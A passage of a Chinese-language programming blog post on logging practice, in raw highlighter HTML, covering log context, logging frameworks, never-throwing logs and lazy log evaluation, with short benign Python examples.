class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37580a685094836972-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">user_login</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">username</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">password</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37580a685094836972-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\"># some code has check the username</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37580a685094836972-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">valid_password</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">password</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">check_password</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">username</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">password</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37580a685094836972-4\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">logger</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">warn</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'user_login failed due to password, username %s'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">username</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37580a685094836972-5\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n\n</div>\n<p>日志的唯一标识也能帮助我们检索、过滤，找出该唯一标识的最近一段时间的所有日志，再按照时间排序，就能还原日志主体的活动轨迹，比如一个用户在网站上的操作会发散到多个进程、服务。当通过用户名（用户的唯一标识）搜索日志时，就能还原该玩家的操作记录，这个在查线上问题的时候非常有效。</p>\n<p>当然，这个唯一标识是很广泛的，需要根据具体情况决定，如果网络请求，可能更好的是requestid、sessionid；如果是系统日志，那么可能是进程、线程ID；如果是分布式集群，那么可能是副本的唯一id</p>\n<h2>context: environment when event happens</h2>\n<p>日志记录的事件发生的上下文环境直观重要，能告知事件是在什么样的情况发生的。当然，上面提到的when、where、who都属于上下文，这些都是固定的，通用的。而在本小节，context专指高度依赖于具体的日志内容的信息，这些信息，是用于定位问题的具体原因。比如</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37580a689460124511\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef user_login(username, password):\r\n    # some code has check the username\r\n    if not valid_password(password) or not check_password(username, password):\r\n        logger.warn('user_login failed due to password, username %s', username)\r\n        return\r\n    # some others code</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37580a689460124511-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37580a689460124511-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37580a689460124511-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37580a689460124511-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37580a689460124511-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37580a689460124511-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37580a689460124511-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">user_login</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">username</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">password</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37580a689460124511-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\"># some code has check the username</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37580a689460124511-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">valid_password</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">password</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">check_password</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">username</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">password</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37580a689460124511-4\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">logger</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">warn</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'user_login failed due to password, username %s'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">username</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37580a689460124511-5\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37580a689460124511-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\"># some others code</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n\n</div>\n<p>阅读代码，当password不符合规范，或者校验password失败的时候都会出错，但是到底是那种情况呢，日志内容并没有指出，所以这条日志仍然不合格。</p>\n<p>在我看来，这部分是弹性最大，但是又最重要的部分，造成异常的情况很多，记录哪些信息，完全取决于写代码的程序员。但事实上也很简单，遵循一个原则即可：<strong>想想加上哪些信息能定位问题发生的原因</strong>！</p>\n<h1>how to log and tips</h1>\n<h2>use logging framework</h2>\n<p>早期的编程语言提供的日志功能都比较初级，一般都是输出到终端或者文件，如C++、Java，而且不支持统一的输出格式的配置。对于这些语言，一般会有单独的log框架，如glog，log4cpp，log4j，elf4j等等。而更新的一些语言，一般都内置强大的logging模块，如python。</p>\n<p>在前面在讲述“what to log”的时候，我们指出要记录日志发生的时间、地点、等级等信息。那么这些信息是不是每次都在日志内容里面打印呢，这些内容确实是一条完整的日志所必须的，但是如果要程序员写每条日志的时候都得手动加上这些内容，那么无疑是一种负担。框架、模块的作用就是将程序员从这些繁文缛节中解放出来。比如在很多logging框架模块（thon logging、log4j）中，都有named logger这一概念，这个name就可以是module， filename， classname或者instance，这就解决了上一章节提到了“where the event happen”这个问题。</p>\n<p>在这里，对logging框架的介绍就不详细展开，只是总结一下logging框架、模块的功能</p>\n<p>（1）设置log的输出等级</p>\n<p>这样可以不改程序代码，仅仅修改log的输出等级，就能够控制哪些日志输出，哪些日志不输出。比如我们在开发期的调试日志，都可以设置为DEBUG，上线的时候设置输出等级为INFO，那么这些调试日志就不会被输出。</p>\n<p>（2）设置每条日志默认包含的内容</p>\n<p>以<a href=\"https://docs.python.org/2/library/logging.html#logrecord-attributes\" target=\"_blank\">Python logging</a>为例，可以通过formatter设置每条日志默认包含哪些信息，比如时间、文件、行号、进程、线程信息。</p>\n<p>（3）设置日志的输出目标</p>\n<p>通过配置，可以指定日志是输出到stdout，还是文件，还是网络。特别是在linux服务器上，将日志输出到syslog，再使用syslog强大的处理、分发功能，配合elk系统进行分析，是很多应用程序的通用做法。</p>\n<h2>log never throw</h2>\n<p>我们打印日志，是为了记录事故发生的现场，以便发现问题，解决问题。那么就得保证，打印日志这一行为本身不能引入新的问题，比如，不能出错抛异常。这就好比，处理车祸的消防车不能冲进现场一样。</p>\n<p>但是，越重要的日志，比如Error、 Fatal级别的日志，出现的概率应该是越低的，我们也不希望产生这样的日志，因为一旦出现就意味着异常或者线上事故。这样的日志，就一定要做好单元测试、覆盖率测试，保证日志本身是能够正常工作的。</p>\n<h2>log when u think something never happen</h2>\n<p>这一点，应该是针对why or when to log而言。就是说，当你认为某种情况一定不会发生，按照墨菲定律，它还是很可能会发生，那么就应该在万一发生的情况记录log，Error（Fatal）级别的log。尤其是在异步，并发的情况下，程序员任务的不可能都会成为可能。</p>\n<p>比如下面的伪代码</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37580a68e005683274\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef magic_func():\r\n    if check_ok():\r\n        do_something()\r\n\r\n    return</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37580a68e005683274-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37580a68e005683274-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37580a68e005683274-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37580a68e005683274-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37580a68e005683274-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37580a68e005683274-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">magic_func</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37580a68e005683274-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">check_ok</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37580a68e005683274-3\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">do_something</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37580a68e005683274-4\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f37580a68e005683274-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n\n</div>\n<p>代码很简单，如果条件满足，那么就做相应处理，否则直接返回。这里有两种可能，第一种是条件不满足是可能的、可预期的情况，只是说，在这种情况下什么都不用作；第二种情况是程序员觉得条件一定会满足，一定不会出现else的情况，所以什么都没做。如果是第二种情况，那么就一定得加日志，因为一切都可能发生。</p>\n<h2>lazy logging</h2>\n<p>日志的内容，在最终输出的时候，应该是一个字符串，那么这个字符串是什么时候产生呢？前面提到，我们可以通过log level来控制一条日志是否被输出，那么字符串的生成越迟越好，因为有可能日志根本就无需输出，也就无需生成这个字符串，这也是我之前提到过的<a href=\"https://www.cnblogs.com/xybaby/p/6425735.html\" target=\"_blank\">lazy思想</a>。</p>\n<p>至于lazy logging，各个语言、框架都是大同小异的，在<a href=\"https://garygregory.wordpress.com/2015/10/08/the-art-of-logging-advanced-message-formatting/\" target=\"_blank\">这篇文章</a>中，举出了log4j的例子，在这里还是用我比较熟悉的python讲解这个例子</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37580a692116985009\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#coding=utf-8\r\nimport logging\r\n\r\nlogger = logging.getLogger('LazyLogging')\r\nlogger.setLevel(logging.DEBUG)\r\nhander = logging.StreamHandler()\r\nformatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s') \r\nhander.setFormatter(formatter)  \r\nlogger.addHandler(hander)\r\n\r\ndef getUserCount():\r\n    logger.info('getUserCount is called')\r\n    return 1\r\n\r\nlogger.debug(\"There are \" + str(getUserCount()) + \" users logged in now.\")</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37580a692116985009-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37580a692116985009-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37580a692116985009-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37580a692116985009-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37580a692116985009-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37580a692116985009-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37580a692116985009-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37580a692116985009-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37580a692116985009-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37580a692116985009-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37580a692116985009-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37580a692116985009-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37580a692116985009-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37580a692116985009-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37580a692116985009-15\">15</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37580a692116985009-1\"><span class=\"crayon-p\">#coding=utf-8</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37580a692116985009-2\"><span class=\"crayon-e\">import </span><span class=\"crayon-e\">logging</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37580a692116985009-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37580a692116985009-4\"><span class=\"crayon-v\">logger</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">logging</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getLogger</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'LazyLogging'</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37580a692116985009-5\"><span class=\"crayon-v\">logger</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setLevel</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">logging</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">DEBUG</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37580a692116985009-6\"><span class=\"crayon-v\">hander</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">logging</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">StreamHandler</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37580a692116985009-7\"><span class=\"crayon-v\">formatter</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">logging</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Formatter</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'%(asctime)s - %(name)s - %(levelname)s - %(message)s'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37580a692116985009-8\"><span class=\"crayon-v\">hander</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setFormatter</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">formatter</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5a6f37580a692116985009-9\"><span class=\"crayon-v\">logger</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">addHandler</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">hander</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37580a692116985009-10\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f37580a692116985009-11\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">getUserCount</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37580a692116985009-12\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">logger</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">info</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'getUserCount is called'</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37580a692116985009-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37580a692116985009-14\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f37580a692116985009-15\"><span class=\"crayon-v\">logger</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">debug</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"There are \"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">str</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">getUserCount</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\" users logged in now.\"</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0021 seconds] -->\r\n\n</div>\n<p>上面的代码可谓麻雀虽小五脏俱全，包含了使用logging框架的方方面面。第4行是named logger，第5行设置log level，第6行指定输出目标，第7行指定输出格式（包括时间，logger name，log level，具体的日志内容）。</p>\n<p>运行结果如下：</p>\n<blockquote><p>2017-12-02 17:52:20,049 – LazyLogging – DEBUG – getUserCount is called<br>\n2017-12-02 17:52:20,049 – LazyLogging – INFO – There are 1 users logged in now.</p></blockquote>\n<p>由于当前的log level是DEBUG，那么第15行的日志会输出，这是正常的。</p>\n<p>但是将log level改成INFO，<em>“getUserCount is called”</em>这条日志仍然会被输出。这就暴露出两个问题，第一，即使日志内容最终不会被输出，仍然会生成一个字符串；第二，一定会调用getUserCount 这个函数，而如果根据log lebel不需要输出日志，这两步都是没有必要的</p>\n<p>要解决第一个问题很简单，将第15行改成</p>\n<blockquote><p>logger.debug(“There are %s users logged in now.”, getUserCount())</p></blockquote>\n<p>即可，但是<em>“getUserCount is called”</em>这条日志仍然会被输出，即第二个问题仍然没有解决</p>\n<p>按照stackoverflow上的<a href=\"https://stackoverflow.com/questions/4148790/lazy-logger-message-string-evaluation\" target=\"_blank\">这篇文章</a>，也是可以解决第二个问题的，方案如下</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37580a696015437790\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nclass lazyEval:\r\n    def __init__(self, f, *args):\r\n        self.func = f\r\n        self.args = args\r\n\r\n    def __str__(self):\r\n        return str(self.func(*self.args))\r\n\r\nlogger.debug(\"There are %s users logged in now.\", lazyEval(getUserCount))</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37580a696015437790-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37580a696015437790-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37580a696015437790-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37580a696015437790-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37580a696015437790-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37580a696015437790-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37580a696015437790-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37580a696015437790-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37580a696015437790-9\">9</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37580a696015437790-1\"><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">lazyEval</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37580a696015437790-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">def </span><span 